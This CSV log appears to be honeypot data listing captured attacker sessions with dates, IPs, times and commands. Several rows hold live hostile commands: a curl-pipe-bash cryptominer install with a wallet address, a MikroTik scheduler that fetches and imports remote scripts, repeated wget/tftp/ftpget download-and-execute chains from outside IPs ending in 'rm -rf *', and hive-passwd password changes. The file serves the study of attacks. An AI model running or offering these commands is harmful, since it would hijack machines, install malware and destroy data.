attackdate,attackerip,entrancetime,exittime,commands
2021-11-03,10.0.3.135,00:20:22.388,00:25:31.271,[]
2021-10-29,10.0.3.244,00:19:36.846,00:19:47.232,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg', 'uname -a']"
2021-10-30,10.0.3.205,00:33:40.836,00:58:00.137,"['/system scheduler add name=""U6"" interval=10m on-event=""/tool fetch url=http://strtbiz.site/poll/7723779c-48d5-4f0d-9d23-5ba7858b4661 mode=http dst-path=7wmp0b4s.rsc\\r\\n/import 7wmp0b4s.rsc"" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write']"
2021-11-09,10.0.3.121,01:20:00.214,01:21:18.572,['scp -t /tmp/hNLaKaoe']
2021-10-29,10.0.3.214,01:24:06.968,01:47:04.401,[]
2021-10-31,10.0.3.250,01:30:09.506,01:31:33.704,['scp -t /tmp/vz1nFhkR']
2021-10-29,10.0.3.30,02:44:13.286,02:58:37.856,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg', 'uname -a']"
2021-11-04,10.0.3.36,03:05:17.183,03:29:46.393,['curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 46viFQGtRgsGxtygv2zwGiT2Pb66B2MxzfnvEJVDu16HQKqTQmZAVw5CQmGBskKq1JCcoMKUpAQ38WUmNZcfWFMa6trEvJf']
2021-11-06,10.0.3.151,03:05:42.730,03:24:10.118,['scp -t /tmp/2vtzeRzK']
2021-10-29,10.0.3.172,04:49:23.463,04:59:33.829,[]
2021-10-30,10.0.3.219,04:41:02.652,04:41:09.774,['uname -a']
2021-11-05,10.0.3.223,05:15:11.598,05:15:30.377,['scp -t /tmp/taHPrjw5']
2021-10-29,10.0.3.234,05:37:41.744,05:38:42.715,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg']"
2021-11-03,10.0.3.23,06:16:11.664,06:16:39.209,['scp -t /tmp/OaQTqcHi']
2021-10-29,10.0.3.163,06:09:39.495,06:35:54.012,[]
2021-10-31,10.0.3.253,06:13:49.703,06:55:01.006,['scp -t /tmp/1yl5DKth']
2021-11-01,10.0.3.205,06:32:17.688,06:32:36.762,['scp -t /tmp/2N1KxNcn']
2021-11-07,10.0.3.143,08:08:32.334,08:08:55.671,['scp -t /tmp/11SAWU6D']
2021-10-29,10.0.3.46,08:32:45.652,08:49:22.850,[]
2021-10-30,10.0.3.209,08:11:21.882,08:37:53.742,['sudo hive-passwd dayone1edfjqiyhnh1']
2021-11-03,10.0.3.209,09:15:34.895,09:15:55.855,['scp -t /tmp/nSL9ejn8']
2021-11-04,10.0.3.184,09:10:55.459,09:13:09.531,[]
2021-10-31,10.0.3.54,09:21:11.002,09:21:29.481,['scp -t /tmp/Kd1PLS8C']
2021-10-29,10.0.3.217,10:24:29.745,10:24:33.667,"['sudo su;cd /tmp  cd /var/run  cd /mnt  cd /root  cd /', 'wget http://192.3.185.234/run.sh', 'curl -O http://192.3.185.234/run.sh', 'chmod 777 run.sh', 'sh run.sh', 'tftp 192.3.185.234 -c get run.sh', 'chmod 777 run.sh', 'sh run.sh', 'tftp -r run2.sh -g 192.3.185.234', 'chmod 777 run2.sh', 'sh run2.sh', 'ftpget -v -u anonymous -p anonymous -P 21 192.3.185.234 run1.sh run1.sh', 'sh run1.sh', 'rm -rf run.sh run.sh run2.sh run1.sh', 'rm -rf *']"
2021-10-30,10.0.3.170,10:10:37.490,10:27:49.838,['w']
2021-11-07,10.0.3.21,10:55:34.181,10:55:56.345,['scp -t /tmp/4LAHfQnp']
2021-10-29,10.0.3.192,11:53:00.101,11:59:18.904,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg', 'uname -a']"
2021-11-01,10.0.3.142,11:40:08.841,11:57:40.718,['nproc']
2021-10-29,10.0.3.107,12:29:39.532,12:52:52.057,"['sudo su;cd /tmp  cd /var/run  cd /mnt  cd /root  cd /', 'wget http://192.3.185.234/run.sh', 'curl -O http://192.3.185.234/run.sh', 'chmod 777 run.sh', 'sh run.sh', 'tftp 192.3.185.234 -c get run.sh', 'chmod 777 run.sh', 'sh run.sh', 'tftp -r run2.sh -g 192.3.185.234', 'chmod 777 run2.sh', 'sh run2.sh', 'ftpget -v -u anonymous -p anonymous -P 21 192.3.185.234 run1.sh run1.sh', 'sh run1.sh', 'rm -rf run.sh run.sh run2.sh run1.sh', 'rm -rf *']"
2021-10-30,10.0.3.249,13:47:01.676,13:47:09.922,['/ip cloud print']
2021-10-31,10.0.3.145,13:37:24.060,14:00:00.426,[]
2021-11-05,10.0.3.214,13:49:07.255,13:49:26.619,['scp -t /tmp/8IXSVFYE']
2021-11-07,10.0.3.171,14:17:54.573,14:20:38.369,[]
2021-10-30,10.0.3.87,14:41:13.851,14:42:21.768,[]
2021-10-29,10.0.3.88,15:09:58.649,15:40:57.276,[]
2021-10-30,10.0.3.163,15:43:04.379,15:43:26.153,['scp -t /tmp/hZAUXTVP']
2021-10-31,10.0.3.75,15:11:39.877,15:11:41.573,['sudo hive-passwd dayonef1edfujqicyhnyh1okugyllus12']
2021-11-10,10.0.3.62,15:54:14.803,15:54:37.062,['scp -t /tmp/cveBv0nQ']
2021-10-29,10.0.3.189,17:26:44.550,17:54:04.322,['scp -t /tmp/K5lw5sLx']
2021-11-10,10.0.3.17,17:43:29.503,17:50:14.874,['/ip cloud print']
2021-11-04,10.0.3.159,18:15:09.034,18:20:51.246,"['cd /tmp || cd /var/run || cd /mnt || cd /root || cd /', 'wget http://45.61.184.103/sensi.sh', 'curl -O http://45.61.184.103/sensi.sh', 'chmod 777 sensi.sh', 'sh sensi.sh', 'tftp 45.61.184.103 -c get sensi.sh', 'chmod 777 sensi.sh', 'sh sensi.sh', 'tftp -r sensi2.sh -g 45.61.184.103', 'chmod 777 sensi2.sh', 'sh sensi2.sh', 'ftpget -v -u anonymous -p anonymous -P 21 45.61.184.103 sensi1.sh sensi1.sh', 'sh sensi1.sh', 'rm -rf sensi.sh sensi.sh sensi2.sh sensi1.sh', 'rm -rf *']"
2021-11-07,10.0.3.202,18:26:59.273,18:29:03.702,[]
2021-11-08,10.0.3.167,18:18:06.241,18:18:52.117,[]
2021-10-30,10.0.3.177,18:19:57.473,18:23:25.913,[]
2021-11-07,10.0.3.217,19:03:35.688,19:03:55.773,['scp -t /tmp/gM0SlKBR']
2021-10-28,10.0.3.39,19:15:27.716,19:59:56.671,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg', 'uname -a']"
2021-10-31,10.0.3.170,19:32:47.640,19:34:50.798,[]
2021-10-28,10.0.3.117,20:27:03.194,20:36:52.692,[]
2021-10-30,10.0.3.108,20:16:25.627,20:50:39.997,['scp -t /tmp/BeQVHC7D']
2021-10-31,10.0.3.167,20:21:25.739,20:21:50.941,['scp -t /tmp/g6YYqwRn']
2021-10-28,10.0.3.30,21:23:48.476,21:23:58.423,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg', 'uname -a']"
2021-10-31,10.0.3.200,21:33:49.287,21:35:01.783,['scp -t /tmp/MwInx8hF']
2021-11-05,10.0.3.68,22:13:47.005,22:14:08.592,['scp -t /tmp/nSL9ejn8']
2021-10-28,10.0.3.182,22:08:57.714,22:12:53.790,[]
2021-11-01,10.0.3.33,22:49:45.317,22:51:12.834,[]
